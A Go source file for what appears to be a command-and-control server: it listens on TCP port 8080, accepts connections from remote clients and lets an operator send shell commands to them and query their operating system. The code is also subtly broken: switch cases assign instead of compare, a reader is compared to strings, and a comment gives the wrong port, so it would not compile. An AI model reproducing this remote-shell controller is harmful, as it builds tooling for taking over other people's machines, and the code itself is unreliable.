package main

import (
	// Standard
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)


func shell(conn net.Conn) {
	for {
		fmt.Printf("[shell]: ")
		reader := bufio.NewReader(os.Stdin)

		cmd, _ := reader.ReadString('\n')

		if strings.Compare(cmd, "close\n") == 0 {
			fmt.Fprintf(conn, cmd)
			break
		}

		fmt.Fprintf(conn, cmd)

		result, _ := bufio.NewReader(conn).ReadString('\n')
		fmt.Println(string(result))
	}
	conn.Close()
}


func sysinfo(conn net.Conn) {
	fmt.Fprintf(conn, "sysinfo")

	result, _ := bufio.NewReader(conn).ReadString('\n')
	switch {
	case result = "windows":
		fmt.Println("The system is running Windows")
	case result = "darwin":
		fmt.Println("The system is running MacOS")
	case result = "linux":
		fmt.Println("The system is running Linux")	
	}
}


func handleConnection(conn net.Conn) {
	fmt.Printf("[C3]: ")
	reader := bufio.NewReader(os.Stdin)

	switch {
		case reader == "shell":
			shell(conn)
		case reader == "sysinfo":
			sysinfo(conn)
		default:
			fmt.Println("Invalid command\n")
	}
}

func main() {
	fmt.Println("Start server...")

	// Listen on port 8000
	ln, err := net.Listen("tcp", ":8080")

	if err != nil {
		fmt.Println("Cannot listen on given port")
	}

	for {
		conn, err := ln.Accept()
		if err != nil {
			// handle error
			continue
		}
		go handleConnection(conn)
	}
}
